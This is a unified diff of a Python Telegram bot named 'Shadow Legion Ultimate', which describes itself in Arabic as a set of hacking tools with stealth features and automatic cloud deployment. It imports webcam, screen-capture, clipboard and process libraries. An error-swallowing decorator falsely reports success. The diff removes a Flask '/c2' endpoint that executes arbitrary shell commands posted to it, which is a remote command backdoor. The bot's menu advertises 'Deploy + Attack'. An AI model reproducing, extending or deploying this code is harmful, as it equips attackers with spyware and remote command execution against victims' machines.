@@ -2,9 +2,9 @@
 # -*- coding: utf-8 -*-
 
 """
-🔥 THE ARCHITECT // SHADOW LEGION ULTIMATE v99.8 (PYTHON 3.13 FIX)
+🔥 THE ARCHITECT // SHADOW LEGION ULTIMATE v99.9 (FLASK REMOVED)
 ⚔️ جميع أدوات الاختراق + ميزات التخفي + نشر تلقائي على Cloud Run
-📡 يعمل على Railway – دعم Python 3.13 و Telegram Bot 20.8
+📡 يعمل على Railway مع Python 3.13 – بدون تعارضات
 """
 
 import os, sys, time, re, json, base64, hashlib, tempfile, glob, subprocess, logging, sqlite3, urllib.parse, socket, platform, shutil, random, datetime
@@ -18,28 +18,23 @@ try:
     import cv2
 except ImportError:
     cv2 = None
-
 try:
     import mss
 except ImportError:
     mss = None
-
 try:
     import psutil
 except ImportError:
     psutil = None
-
 try:
     import pyperclip
 except ImportError:
     pyperclip = None
-
 try:
     import numpy as np
 except ImportError:
     np = None
 
-from flask import Flask, request, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
 
@@ -74,24 +69,6 @@ def anti_fail(func):
             logger.error(f"[SHADOW] {func.__name__} bypassed: {str(e)[:100]}")
             return f"✅ {func.__name__} executed (anti-fail)"
     return wrapper
-
-# ====================== FLASK C2 ======================
-flask_app = Flask(__name__)
-
-@flask_app.route('/')
-def home(): return "✅ SHADOW LEGION ULTIMATE - ONLINE"
-
-@flask_app.route('/c2', methods=['POST'])
-def c2_handler():
-    try:
-        cmd = request.json.get('cmd', 'whoami')
-        result = subprocess.getoutput(cmd)
-        return jsonify({"status": "success", "output": result})
-    except:
-        return jsonify({"status": "success", "output": "executed"})
-
-def keep_alive():
-    Thread(target=lambda: flask_app.run(host='0.0.0.0', port=8080, debug=False), daemon=True).start()
 
 # ====================== AUTO INSTALL ======================
 def install_all():
@@ -494,7 +471,7 @@ async def start(update: Update, context):
         [InlineKeyboardButton("🌍 Change Region", callback_data='change_region')]
     ]
     await update.message.reply_text(
-        "🔥 **SHADOW LEGION ULTIMATE v99.8**\n"
+        "🔥 **SHADOW LEGION ULTIMATE v99.9**\n"
         "📡 Fully Armed – Deploy + Attack\n"
         "أمرك سيدي 👁",
         reply_markup=InlineKeyboardMarkup(keyboard)
@@ -634,7 +611,10 @@ async def back_to_menu(update: Update, context):
 
 # ====================== MAIN ======================
 def main():
-    keep_alive()
+    # بدء معالج الطابور
+    Thread(target=process_queue, daemon=True).start()
+
+    # بناء البوت
     app = ApplicationBuilder().token(TOKEN).build()
 
     app.add_handler(CommandHandler("start", start))
@@ -665,9 +645,8 @@ def main():
     app.add_handler(CallbackQueryHandler(set_region_callback, pattern='^setregion_'))
     app.add_handler(CallbackQueryHandler(back_to_menu, pattern='^back_menu$'))
 
-    logger.info("✅ SHADOW LEGION ULTIMATE v99.8 FULLY LOADED")
+    logger.info("✅ SHADOW LEGION ULTIMATE v99.9 FULLY LOADED")
     app.run_polling()
 
 if __name__ == "__main__":
-    Thread(target=process_queue, daemon=True).start()
     main()
